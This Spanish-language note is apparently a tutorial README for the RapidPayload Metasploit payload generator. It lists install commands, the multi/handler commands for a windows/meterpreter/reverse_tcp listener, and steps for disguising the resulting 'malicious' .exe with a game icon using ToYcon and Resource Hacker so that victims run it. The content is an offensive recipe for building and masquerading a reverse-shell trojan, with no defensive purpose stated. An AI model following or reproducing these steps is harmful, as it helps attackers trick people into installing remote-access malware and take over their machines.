# Payloads
Es un generador de carga útil (Payload) de Metasploit que permite generar rápidamente una carga útil para Windows, Linux y Android.

El proyecto se encuentra disponible en github, para obtenerlo únicamente se debe clonar el siguiente repositorio:

* https://github.com/AngelSecurityTeam/RapidPayload.git

La instalación de Rapid Payload es sencilla únicamente debemos contar con los siguientes requisitos:

* OpenJDK 8 (JAVA) , or superiors versions .
* Metasploit
* Apktool
* Python3
* Wine

Todos los requerimientos que se necesitan los encontramos en Kali Linux, si se utiliza  una versión anterior a la 20.2 es posible que sea necesario instalar python 3.


El proceso de instalación es bastante simple, únicamente debemos correr los siguientes comandos en el orden que se muestran:

### Tipos de Payloads
* Singles: son unicos y completamente independientes. Pueden ser usadsos sin la necesidad de metasploit
* Stangers: estos configuran una concexion de red entre el atacante y la victima. Son pequeños y confiables
* Stages: son compenentes que se descargan por los modulos Stagers. Proporcionan funciones avanzadas como meterpreter, inyeccion VNC 

### Paso a paso 
cd RapidPayload
bash install.sh
python3 RapidPayload.py

### Dentro de metasploit y con el archivo .exe (malisioso) creada usar el siguiente comando 
* use exploit/multi/handler
* set payload windows/meterpreter/reverse_tcp
* set lhost IP LOCAL 
* set lport MISMO PUERTO DEL ARCHIVO MALISIOSO CREADO
* options (para chequear)
* exploit -j

### Para el archivo malisioso
* Con el programa **Resource Hacker** y con **ToYcon**
* Buacar iconos o imagenes por ejemplo del juego LOL
* Con ToYcon genero que esa foto sea un logo
* Con Resource Hacker la uso para ponerla arriba del archivo malisioso

Una vez que se ha instalado la herramienta entonces podremos mandarla a llamar y hacer uso de ella.

# Resource hacker 
Es una aplicación freeware de extracción de recursos para Windows. Se usa para modificar elementos de programas o del sistema operativo, como iconos, extrayendo recursos de programas ejecutables, bibliotecas de enlace dinámico, y ficheros de recursos.

La herramienta está disponible para su instalación en sistema operativo Windows  y Linux. En el caso de Linux deberá ser ejecutado mediante el complemento “wine”.


* http://www.angusj.com/resourcehacker/

## ¿Cómo instalar resource hacker?
Instalación en entorno Windows:

El proceso de instalación es bastante sencillo, únicamente se debe seguir el paso a paso del asistente y en unos pocos clics el programa estará instalado y listo para utilizarse.



















